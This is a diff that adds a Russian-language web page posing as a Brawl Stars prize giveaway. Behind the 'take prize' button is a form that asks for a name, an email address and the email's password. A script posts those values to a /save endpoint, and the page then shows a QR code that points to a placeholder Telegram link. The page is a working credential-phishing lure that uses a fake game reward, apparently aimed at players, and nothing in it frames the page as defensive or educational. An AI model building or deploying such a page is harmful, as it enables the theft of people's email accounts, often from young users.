@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Brawl Stars Призы</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #111;
+            color: white;
+            text-align: center;
+            padding: 50px;
+        }
+        .container {
+            background: #1e1e1e;
+            padding: 20px;
+            border-radius: 10px;
+            width: 300px;
+            margin: auto;
+        }
+        input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: none;
+        }
+        button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            background: orange;
+            cursor: pointer;
+        }
+        #form, #qr {
+            display: none;
+        }
+        img {
+            margin-top: 20px;
+            width: 200px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Brawl Stars Подарок 🎁</h2>
+
+    <button onclick="showForm()">Взять приз</button>
+
+    <div id="form">
+        <input type="text" placeholder="Имя">
+        <input type="text" placeholder="электронная почта">
+        <input type="text" placeholder="пароль электронной почты">
+        <button onclick="sendData()">Далее</button>
+    </div>
+
+    <div id="qr">
+        <p>Сканируйте QR-код для получения приза</p>
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=https://t.me/your_link">
+    </div>
+</div>
+
+<script>
+function showForm() {
+    document.getElementById('form').style.display = 'block';
+}
+
+function sendData() {
+    const inputs = document.querySelectorAll("input");
+
+    const data = {
+        name: inputs[0].value,
+        surname: inputs[1].value,
+        nickname: inputs[2].value
+    };
+
+    fetch('/save', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    })
+    .then(res => res.json())
+    .then(res => {
+        document.getElementById('form').style.display = 'none';
+        document.getElementById('qr').style.display = 'block';
+    });
+}
+</script>
+
+</body>
+</html>
